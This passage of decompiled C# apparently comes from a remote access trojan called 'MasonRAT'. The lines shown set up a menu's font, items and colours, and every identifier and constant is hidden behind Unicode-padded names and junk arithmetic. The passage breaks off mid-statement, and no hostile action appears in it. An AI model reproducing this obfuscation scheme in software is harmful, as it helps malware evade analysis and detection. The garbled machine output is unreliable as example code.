    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 168), 12f, FontStyle.Regular, (GraphicsUnit) (~1248643779 - 1974685050 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 - ((1886000377 > 882797990 ? 970581268 : 1294108357) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 | (1281668823 > 963778357 ? 656384699 : 875179598) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)), (byte) 0);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.ImageScalingSize = new Size((((1607912967 << 1595109288) - 2106505795 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) > 491000097 + (1865373868 >> 986760699) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ? 691021886 - 691021866 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 : 177040568 - 177040542 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 21);
    ToolStripItemCollection items = this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.Items;
    ToolStripItem[] toolStripItems1 = new ToolStripItem[(-2075436814 - 1025886385 % 197531576 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + ((-736934197 ^ ~1847548162) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 | (1948235493 > 998137757 ? 971741492 : 1295655322) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)];
    toolStripItems1[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ;
    toolStripItems1[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A;
    toolStripItems1[((46217 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ (1514649255 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 >> ((166279545 ^ 169762806 % 631927232) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A;
    toolStripItems1[(-1965153849 - 228206719 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 > (-404065809 - (1953721238 | 755672555) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) ? (373221379 ^ 1902374528 << 618490372) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 : 4 - (77780160 >> 63137182) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A;
    toolStripItems1[(694703735 - 380312531 % 1880408890 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ((1787367418 ^ 8) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) % (600976849 - 109984779 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁;
    toolStripItems1[(417448764 - 417454955 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + (((-219930510 ^ -355446011) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) >> (1578057664 - ~493597999 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F;
    toolStripItems1[(970 - (2010874511 >> 1546815925) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0 ^ (798394432 > 614192743 ? 10 : 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ;
    toolStripItems1[(1796062490 + 1754632142 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 ^ ~(727795867 + (2109029019 >> 934452391) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ;
    toolStripItems1[((171591975 > 1834595702 ? -637370958 : -478028219) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + (117318083 + (1708222550 << 1891737366) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ;
    toolStripItems1[(1231550576 - 1231550551 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ (5996064 ^ 374755 << 1444197508) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ;
    toolStripItems1[-510209374 - (1707839773 >> 697064607) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 + ((510209321 ^ 136682766 >> 2000682997) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) % (-2040128982 - 366813852 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608;
    toolStripItems1[1984241535 - 843187277 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 + ~(-1040536006 - 2113377044 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ;
    toolStripItems1[((-1536640005 ^ ~1273970343) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ^ (552662356 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 >> (-2041583420 - 934014915 % 1759952358 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ;
    toolStripItems1[1423597647 + 90601291 % 1931767512 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + -(1929278734 - 415079809 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = (ToolStripItem) this.\u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F;
    toolStripItems1[((1073733601 ^ (521640190 | 788223902)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 ^ (6 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة;
    items.AddRange(toolStripItems1);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 169);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.ArrowColor = Color.FromArgb(((109279219 ^ 1607894720 >> 1886790025) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + ~((974827004 << 99809201) - 1431004058 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), ((105 ^ 744989628 >> 602959895) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ 5110 - (334081045 >> 940838448) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, (1339221919 - 2067017800 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + (-1672993974 - 1894177285 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1));
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.BorderColor = Color.FromArgb(((1297738417 ^ 1200901634 << 1964871690) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) - ((476177006 ^ 1752952382 >> 1639849180) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) % (1823204133 - 561771640 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, (992603092 + (852362001 | 426689162) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 > (1058422213 | 2084669428) - 1998798521 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ? (-1746992014 ^ -1746992050) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 : (910216658 > 2082072608 ? 106 : 80 /*0x50*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), (2112943052 - (810615737 | 1698484489) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 ^ (-291155004 - (768861645 << 779502111) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) % ((428165194 > 2123675733 ? -2008879375 : 1714565941) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.ColorTable = (ProfessionalColorTable) null;
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.RoundedEdges = true;
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.SelectionArrowColor = Color.FromArgb((-1403931061 - (381457575 << 1709357155) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + (334968728 % 1591617247 - 174344290 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), (-2104921676 - ~1226376247 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - -(1367445762 + ~488900273 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (1610992255 >> 2127047400) - 1690564493 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - ~(1684271708 + (271034106 >> 1845081883) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1));
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.RenderStyle.SelectionBackColor = Color.FromArgb((161090652 - 960982227 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ^ ~(-2088552175 - 1406523647 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, (1681316785 + 735070293 % 1573577290 + 